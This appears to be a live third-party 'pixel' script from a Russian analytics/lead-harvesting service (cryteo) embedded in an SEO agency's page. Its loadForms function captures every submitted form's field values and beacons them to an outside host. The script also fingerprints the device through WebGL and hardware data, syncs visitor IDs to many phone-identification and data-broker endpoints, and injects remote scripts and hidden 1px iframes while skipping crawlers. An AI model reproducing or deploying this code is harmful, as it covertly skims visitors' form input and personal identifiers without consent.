/* pixel 5 */
if (window.cryteo === undefined){
window.cryteo = 1;
;
function findGetParameter(parameterName) {
	let result = null,
		tmp = [];
	let items = location.search.substr(1).split("&");
	for (let index = 0; index < items.length; index++) {
		tmp = items[index].split("=");
		if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
	}
	return result;
}

function getUrlVars(url) {
	let hash;
	let myJson = {};
	if (url != undefined && url != null) {
		let hashes = url.slice(url.indexOf("?") + 1).split("&");
		for (let i = 0; i < hashes.length; i++) {
			hash = hashes[i].split("=");
			myJson[hash[0]] = hash[1];
		}
	}
	return myJson;
}

var ajax = {};

ajax.x = function () {
	if (typeof XMLHttpRequest !== "undefined") {
		return new XMLHttpRequest();
	}
	var versions = [
		"MSXML2.XmlHttp.6.0",
		"MSXML2.XmlHttp.5.0",
		"MSXML2.XmlHttp.4.0",
		"MSXML2.XmlHttp.3.0",
		"MSXML2.XmlHttp.2.0",
		"Microsoft.XmlHttp",
	];

	let xhr;
	for (let i = 0; i < versions.length; i++) {
		try {
			xhr = new ActiveXObject(versions[i]);
			break;
		} catch (e) {}
	}
	return xhr;
};

ajax.send = function (url, callback, method, data, async) {
	if (async === undefined) {
		async = true;
	}
	let x = ajax.x();
	x.open(method, url, async);
	x.onreadystatechange = function () {
		if (x.readyState == 4) {
			callback(x.responseText);
		}
	};
	if (method == "POST") {
		x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	}
	x.send(data);
};

ajax.post = function (url, data, callback, async) {
	let query = [];
	for (let key in data) {
		query.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
	}
	ajax.send(url, callback, "POST", query.join("&"), async);
};

// return cookie by name, if exist, if not exist, return undefined
function getCookie(name) {
	var matches = document.cookie.match(
		new RegExp(
			"(?:^|; )" +
				name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") +
				"=([^;]*)"
		)
	);
	return matches ? decodeURIComponent(matches[1]) : undefined;
}

ajax.get = function (url, data, callback, async) {
	let query = [];
	for (let key in data) {
		query.push(encodeURIComponent(key) + "=" + encodeURIComponent(data[key]));
	}
	ajax.send(
		url + (query.length ? "?" + query.join("&") : ""),
		callback,
		"GET",
		null,
		async
	);
};

//create cookie for visitors
function makeid() {
	let text = "";
	let possible =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

	for (let i = 0; i < 60; i++)
		text += possible.charAt(Math.floor(Math.random() * possible.length));

	return text;
}

//get cookie
function getCookies() {
	let pairs = document.cookie.split(";");
	let cookies = {};
	for (let i = 0; i < pairs.length; i++) {
		let pair = pairs[i].split("=");
		cookies[pair[0]] = unescape(pair[1]);
	}
	return cookies;
}

function getScript(source, callback) {
	let script = document.createElement("script");
	let prior = document.getElementsByTagName("script")[0];
	script.async = 1;
	prior.parentNode.insertBefore(script, prior);

	script.onload = script.onreadystatechange = function (_, isAbort) {
		if (
			isAbort ||
			!script.readyState ||
			/loaded|complete/.test(script.readyState)
		) {
			script.onload = script.onreadystatechange = null;
			script = undefined;

			if (!isAbort) {
				if (callback) callback();
			}
		}
	};

	script.src = source;
}

function j(u, c) {
	let h = document.getElementsByTagName("head")[0],
		s = document.createElement("script");
	s.async = true;
	s.src = u;
	s.onload = s.onreadystatechange = function () {
		if (!s.readyState || /loaded|complete/.test(s.readyState)) {
			s.onload = s.onreadystatechange = null;
			if (h && s.parentNode) {
				h.removeChild(s);
			}
			s = undefined;
			if (c) {
				c();
			}
		}
	};
	h.insertBefore(s, h.firstChild);
}

//disable cookie
function delete_cookie(name, path, domain) {
	if (get_cookie(name)) {
		document.cookie =
			name +
			"=" +
			(path ? ";path=" + path : "") +
			(domain ? ";domain=" + domain : "") +
			";expires=Thu, 01 Jan 1970 00:00:01 GMT";
	}
}

function is_mobile() {
	if (
		/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
			navigator.userAgent
		)
	) {
		return true;
	} else {
		return false;
	}
}
/* * /functions */

/**
 * Get current browser viewpane heigtht
 */
function get_window_height() {
	return (
		window.innerHeight ||
		document.documentElement.clientHeight ||
		document.body.clientHeight ||
		0
	);
}

/**
 * Get current absolute window scroll position
 */
function get_window_Yscroll() {
	return (
		window.pageYOffset ||
		document.body.scrollTop ||
		document.documentElement.scrollTop ||
		0
	);
}

/**
 * Get current absolute document height
 */
function get_doc_height() {
	return Math.max(
		document.body.scrollHeight || 0,
		document.documentElement.scrollHeight || 0,
		document.body.offsetHeight || 0,
		document.documentElement.offsetHeight || 0,
		document.body.clientHeight || 0,
		document.documentElement.clientHeight || 0
	);
}

/**
 * Get current vertical scroll percentage
 */
function get_scroll_percentage() {
	return (
		((get_window_Yscroll() + get_window_height()) / get_doc_height()) * 100
	);
}

function hasClass(elem, className) {
	return elem.className.split(" ").indexOf(className) > -1;
}

function createStyle(href) {
	let resource = document.createElement("link");
	resource.setAttribute("rel", "stylesheet");
	resource.setAttribute("href", href);
	resource.setAttribute("type", "text/css");
	let head = document.getElementsByTagName("head")[0];
	head.appendChild(resource);
}

function botCheck() {
	let botPattern =
		"(googlebot/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|Yandex Mobile Bot|AdsBot Google|YandexMetrika|Phantom.js bot|YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexScreenshotBot|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YandexAdNet|YandexDirect|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVertis|YandexForDomain|YandexBot|YandexSpravBot|YandexSearchShop|YandexMedianaBot|YandexOntoDB|YandexOntoDBAPI|YandexVerticals|GoogleBot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|AdsBot-Google|AdsBot-Google-Mobile-Apps|Google Web Preview|Adbeat Bot|AdbeatBot|adbeat_bot|adbeat-bot|Screenshot Bot|ScreenshotBot|screenshot_bot|screenshot-bot|NaverBot|Naver Bot|naver-bot|naver_bot|Google Bot|google-bot|google_bot|googlebot|AddThis)";

	let re = new RegExp(botPattern, "i");
	let userAgent = navigator.userAgent;
	if (re.test(userAgent)) {
		return true;
	} else {
		return false;
	}
}

function yandexCheck() {
	let botPattern =
		"(yandex/|Yandex Mobile Browser|Yandex Browser|Yandex Mobile|YaBrowser)";

	let re = new RegExp(botPattern, "i");
	let userAgent = navigator.userAgent;
	if (re.test(userAgent)) {
		return true;
	} else {
		return false;
	}
}

function get_domian_with_protocol() {
	return (
		location.protocol +
		"//" +
		location.hostname +
		(location.port ? ":" + location.port : "")
	);
}

function isHidden() {
	if (!document.hidden) {
		return true;
	} else {
		return false;
	}
}

function myClickHandler(e) {
	// Here you'll do whatever you want to happen when they click

	// now this part stops the click from propagating
	if (!e) var e = window.event;
	e.cancelBubble = true;
	if (e.stopPropagation) e.stopPropagation();
}

function isPopupEnabled() {
	let newWin = window.open(
		"https://prostats.info/is-popup-blocked.php",
		"_blank",
		"toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none"
	);

	if (!newWin || newWin.closed || typeof newWin.closed == "undefined") {
		return false;
	} else {
		newWin.close();
		return true;
	}
}

function dateNowSeconds() {
	let timeStampInMs = new Date() / 1000;
	return Math.round(timeStampInMs);
}

function getHours() {
	let d = new Date();
	return d.getHours();
}

function loadForms(vid) {
	for (let i = 0; i < document.forms.length; i++) {
		document.forms[i].addEventListener("submit", function (e) {
			e = e || window.event;
			let target = e.target || e.srcElement;
			let query = serialize(e.target);
			(window.Image ? new Image() : document.createElement("img")).src =
				"https://qoopler.ru/event_collect_forms.php?vid=" + vid + "&" + query;
			return true;
		});
	}
}

function serialize(form) {
	let field,
		s = [];
	if (typeof form == "object" && form.nodeName == "FORM") {
		let len = form.elements.length;
		for (i = 0; i < len; i++) {
			field = form.elements[i];
			if (
				field.name &&
				!field.disabled &&
				field.type != "file" &&
				field.type != "reset" &&
				field.type != "submit" &&
				field.type != "button"
			) {
				if (field.type == "select-multiple") {
					for (j = form.elements[i].options.length - 1; j >= 0; j--) {
						if (field.options[j].selected)
							s[s.length] =
								encodeURIComponent(field.name) +
								"=" +
								encodeURIComponent(field.options[j].value);
					}
				} else if (
					(field.type != "checkbox" && field.type != "radio") ||
					field.checked
				) {
					s[s.length] =
						encodeURIComponent(field.name) +
						"=" +
						encodeURIComponent(field.value);
				}
			}
		}
	}
	return s.join("&").replace(/%20/g, "+");
}

var Ajax1 = {
	request: function (ops) {
		if (typeof ops === "string") ops = { url: ops };
		ops.url = ops.url || "";
		ops.method = ops.method || "get";
		ops.data = ops.data || {};

		let api = {
			host: {},
			process: function (ops) {
				let postBody = "",
					self = this;
				this.xhr = null;
				this.xhr = window.ActiveXObject
					? new ActiveXObject("Microsoft.XMLHTTP")
					: new XMLHttpRequest();

				if (this.xhr) {
					this.onreadystatechange = function () {
						if (self.xhr.readyState === 4 && self.xhr.status === 200) {
							var result = self.xhr.responseText;
							if (ops.json === true && typeof JSON != "undefined") {
								result = JSON.parse(result);
							}
							self.doneCallback &&
								self.doneCallback.apply(self.host, [result, self.xhr]);
						} else if (self.xhr.readyState === 4) {
							self.failCallback &&
								self.failCallback.apply(self.host, [self.xhr]);
						}
						self.alwaysCallback &&
							self.alwaysCallback.apply(self.host, [self.xhr]);
					};
				}

				if (ops.method === "get") {
					this.xhr.open("GET", ops.url + getParams(ops.data, ops.url), true);
				} else {
					this.xhr.open(ops.method, ops.url, true);
					this.setHeaders({
						"X-Requested-With": "XMLHttpRequest",
						"Content-type": "application/x-www-form-urlencoded",
					});
				}

				if (ops.headers && typeof ops.headers === "object") {
					this.setHeaders(ops.headers);
				}

				setTimeout(function () {
					ops.method === "get"
						? self.xhr.send()
						: self.xhr.send(getParams(ops.data));
				});

				return this;
			},
			done: function (callback) {
				this.doneCallback = callback;
				return this;
			},
			fail: function (callback) {
				this.failCallback = callback;
				return this;
			},
			always: function (callback) {
				this.alwaysCallback = callback;
				return this;
			},
			setHeaders: function (headers) {
				for (var name in headers) {
					this.xhr && this.xhr.setRequestHeader(name, headers[name]);
				}
			},
		};

		getParams = function (data, url) {
			let arr = [],
				str;
			for (var name in data) {
				arr.push(name + encodeURIComponent(data[name]));
			}
			str = arr.join("&");
			if (str !== "") {
				return url ? (url.index("?") < 0 ? "?" + str : "&" + str) : str;
			}
			return "";
		};

		return api.process(ops);
	},
};

            var OAuth_utm = "";
            var OAuth_workdays = "";

            var getHoursD = (new Date()).getHours();
            var getDay = (new Date()).getDay(); getDay = (getDay == 0) ? 7 : getDay;
            var start_work = -1;
            var end_work = -1;
            if (!botCheck()){
            var SERVER_NAME = "https://cryteo.ru/";

            var _delay = 1;

            var OAuth = getCookie('OAuth_cryteo');

            var cookie_date_obj = new Date(1705299062000 + 30 * 86400 * 1000);
            var cookie_date_toUTCString = cookie_date_obj.toUTCString();
            //console.log(cookie_date_toUTCString);

            var domain_id = "213034";
            var wr_csrf = "50d3a9e2dd0bf5a7ed4600c1868939fa";
            var user_id = "85403";
            var role_id = "5";
            var domain_delay = "0";
            var catchform = "0";
            var postpay = "";
            var geo_filter = "0";
            var hqdata = "0";
            var allow_limit_phone = 0;
            var limit_phone = 0;
            var max_limit_phone = 0;
            var is_load_forms = 1;

            var view_id = null;

            var OAuth_url_string = window.location.href.toLowerCase();
            var OAuth_is_utm = [];
            var OAuth_utm_terms_string = OAuth_utm;


              	var imgcd = 6438220;
              	
              	if ( (OAuth == undefined || OAuth == null || OAuth == "" || OAuth == "off") ) {
                  	document.cookie = "OAuth_cryteo=off; path=/; expires="+cookie_date_toUTCString;

					setTimeout(function () {
						console.log("Pxl is working...");

						ajax.post('https://cryteo.ru/' + 'actionv4.php',
						{
							referer: "",
							domain_id: domain_id,
							user_id: user_id,
							csrf: wr_csrf,
							url: "https://www.demis.ru/seo-prodvijenie-saytov/",
							url_clear: "cryteo.demis.ru",
							url_page: 'https://www.demis.ru/seo-prodvijenie-saytov/',
							geo_filter: "0",
							allow_phone: "1",
							com: "65a4b72bab4f85.56231796_2299"
						},
						function(data){
							//console.log(data);
							var array = JSON.parse(data);
							region_id = 0;

							if (array.sxgeo != "off" && array.sxgeo != undefined && array.sxgeo.region != undefined && array.sxgeo.region.id != undefined){
								region_id = array.sxgeo.region.id;
							}

							OAuth = array.visit_id;
							if (OAuth != undefined && OAuth != "off"){
								view_id = array.view_id;
								OAuth_view_id = array.view_id;
								device_id = array.device_id;
								var date = new Date(1705299062000 + 30 * 86400 * 1000);
								document.cookie = "OAuth_cryteo="+OAuth+"; path=/; expires="+cookie_date_toUTCString;
								document.cookie = "wr_visit_cryteo_id="+OAuth+"; path=/; expires="+cookie_date_toUTCString;

								(window.Image ? (new Image()) : document.createElement('img')).src = 'https://statik-us.info/cid.php?oauth='+OAuth;

								
								
								function frml(frameid, link) {
    var ifram = document.createElement('div');
    ifram.style.transform = "none";
    ifram.innerHTML = '<iframe src="' + link + '" name="' + frameid + '" id="' + frameid + '" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:1px; height:1px; border:none; margin:0; padding:0; filter:alpha(opacity=0); opacity:0; cursor: pointer; z-index:88888;" /><\/iframe>';
    (document.getElementsByTagName('html')[0] || document.body).appendChild(ifram);
    ifram = document.getElementById(frameid);
    ifram.style.transform = "none";
    ifram.style.visibility = "hidden";
    ifram.style.height = "1px";
    ifram.style.width = "1px";
    ifram.parent = undefined;
    //console.log('tat');
}

	(function (window, document, visit_id) {
			var elemdmp = document.createElement('script');
			elemdmp.type = 'text/javascript';
			elemdmp.async = true;
			elemdmp.src = 'https://prostats.info/mr/q.php?v=' + OAuth;
			var sdmp = document.getElementsByTagName('script')[0];
			sdmp.parentNode.insertBefore(elemdmp, sdmp);
})(window, window.document, OAuth);

	var ymllnk = 'https://prostats.info/mr/index.php?vid='+OAuth;
frml('ymli',ymllnk);


//var pcbklnk = 'https://pxl.knam.pro/code/prov9.php?vid='+OAuth;
//frml('pcbklnk',pcbklnk);

											
	
	
	
				(function (window, document) {
			var elemone = document.createElement('script');
			elemone.src = 'https://js.onef.pro/static/reg1f_v1.js?1f_pixel_id=7c8ac932-76b2-40b8-a5be-4b5da7182fd5&product=cryteo.demis.ru';
			elemone.type='text/javascript';
			elemone.async = true;
			var sone = document.getElementsByTagName('script')[0];
			sone.parentNode.insertBefore(elemone, sone);
		})(window, window.document);
	
	setTimeout(function () {
		ajax.post('https://perstat.ru/api/visits/phones.php',
		    {
		        visit_id: OAuth,
		    },
		    function(data){
		    	var ааа111 = JSON.parse(data);
		    	if (!ааа111.res){


		    				    								//mts
			/* (window.Image ? (new Image()) : document.createElement('img')).src = 'https://manalyticshub.com/m/watch?type=2&token=E90F9CB0-B3F5-49A2-95C4-79646667A090&sid='+array.vidmtbmhash; */
							(function (window, document) {
					var elemmts = document.createElement('script');
					elemmts.src = 'https://manalyticshub.com/m/watchjsu?token=3015f6f3-2f24-4d0e-97bc-846421f88cf5&sid='+array.vidmtbmhash;
					elemmts.type='text/javascript';
					elemmts.async = true;
					var smts = document.getElementsByTagName('script')[0];
					smts.parentNode.insertBefore(elemmts, smts);

					//console.log('c55');
				})(window, window.document);
						//console.log('m sent');
					    				    	}
		    }
    	)
	}, 5000);

		//mega IMG end

	
	


	    	//var ymllnk = 'https://ixseptor.ru/ph/yaomli.php?id=w'+OAuth;
    	//frml('ymli',ymllnk);
    	//console.log('yml ixcept');
    
	/*(window.Image ? (new Image()) : document.createElement('img')).src = 'https://get4click.ru/api/get-cookie/a16762da3db2b5b052c5eeb938978665916c3d51/pixel/?pid='+OAuth+'v2';
	//console.log('get4c');*/

			(window.Image ? (new Image()) : document.createElement('img')).src = 'https://whitesaas.com/api/phone/check?api_key=rcZ61JD1pinUKP5HOH9ZeBomEdlN7VEXcizbUdsrXjIvbGupbTm&k_id='+OAuth+'&k_v=2&r=https://ruperstat.ru/ext/datastore/pcbk.php';
		//console.log('pcb');
	
	
	
	
						(window.Image ? (new Image()) : document.createElement('img')).src = 'https://counter.yadro.ru/corresp/wantres.gif?id='+OAuth;
				//console.log('li');

										(window.Image ? (new Image()) : document.createElement('img')).src = 'https://dmg.digitaltarget.ru/1/7523/i/i?host_id=213034';
						
	
						/* (function (window, document) {
				var elemdp = document.createElement('script');
				elemdp.src = 'https://profilepxl.ru/s.js?id=2c0ff630-558f-4ef6-883e-a7210c63ef37&pid='+OAuth;
				elemdp.type='text/javascript';
				elemdp.async = true;
				var sdp = document.getElementsByTagName('script')[0];
				sdp.parentNode.insertBefore(elemdp, sdp);

				//console.log('c5');
			})(window, window.document); */
			



						var elemlp = document.createElement('script');
			elemlp.type='text/javascript';
			elemlp.async = true;
			elemlp.src = 'https://lpt-crm.online/code/new/76284';
			var slp = document.getElementsByTagName('script')[0];
			slp.parentNode.insertBefore(elemlp, slp);
			//console.log('lp');
			


/*var tazlnk = 'https://ixseptor.ru/ph/tazeros2.php?vid='+OAuth;
frml('tazlnk',tazlnk);*/

/* var ncbh = 'https://ruperstat.ru/cbh.php?vid='+OAuth;
frml('ncbh',ncbh); */




	
var brokenImagesInterval = setInterval(function(){
	var brokenImages = document.getElementsByTagName('img');
	for(let i = 0; i < brokenImages.length; i++) {
		if (brokenImages[i].src.match(/sas-pro.ru\/pixel/g)){
			//console.log(brokenImages[i].src);
			brokenImages[i].style.display = 'none';
			clearInterval(brokenImagesInterval);
		}
	}
}, 5000)

								function loadscript(link) {
    f = document.createElement("script");
    f.type = "text/javascript";
    f.src = link;
    f.async = !0;
    f.charset = "UTF-8";
    document.head.appendChild(f);
}

(window.Image ? (new Image()) : document.createElement('img')).src = 'https://statistik1.ru/pixel/ph/pixel/v2.php?oauth='+OAuth;

								//console.log("in roistat"+getCookie('OAuth'));

								function getWebGLVendor() {
								  try {
								  	var canvas = document.createElement("canvas");
								  	var ctx = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
								  	return ctx.getParameter(ctx.getExtension('WEBGL_debug_renderer_info').UNMASKED_VENDOR_WEBGL);
								  } catch (e) {
								  	return 'not supported'
								  }
								}

								function getWebGLRenderer() {
									try {
										var canvas = document.createElement("canvas");
										var ctx = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
										return ctx.getParameter(ctx.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
									} catch (e) {
										return 'not supported'
									}
								}

								(window.Image ? (new Image()) : document.createElement('img')).src =
								"https://perstat.ru/pixel/fp.php?vid="+OAuth
								+"&url=" + encodeURIComponent(window.location.href)
								+"&colord="+screen.colorDepth
								+"&screenw="+window.screen.width
								+"&screenh="+window.screen.height
								+"&devicememory="+window.navigator.deviceMemory
								+"&hardwareconcurrency="+window.navigator.hardwareConcurrency
								+"&platform="+window.navigator.platform
								+"&webglvendor="+getWebGLVendor()
								+"&webglrenderer="+getWebGLRenderer()
								+"&timeoffset="+(new Date()).getTimezoneOffset();

		              			(window.Image ? (new Image()) : document.createElement('img')).src = "https://ruperstat.ru/ext/datastore/pixel/img.php?src=index&domain_id=213034&visit_id="+OAuth+"&rand="+imgcd+"&ip=46.251.210.46&page="+encodeURIComponent(location.href);
	                  		}
						});
					}, 0);

              	} else{
                  	if (OAuth != undefined && OAuth != "off"){
                  		(window.Image ? (new Image()) : document.createElement('img')).src = "https://ruperstat.ru/ext/datastore/pixel/img.php?domain_id=213034&visit_id="+OAuth+"&rand="+imgcd+"&ip=46.251.210.46&page="+encodeURIComponent(location.href);

                  		window.addEventListener('beforeunload', function (e) {
                  			(window.Image ? (new Image()) : document.createElement('img')).src = "https://ruperstat.ru/ext/datastore/pixel/imgc.php?rand="+imgcd+"&visit_id="+OAuth;
                  		}, false);
                  	}
              	};
              	}
            }else{
      /* console.log(window.cryteo); */
      }
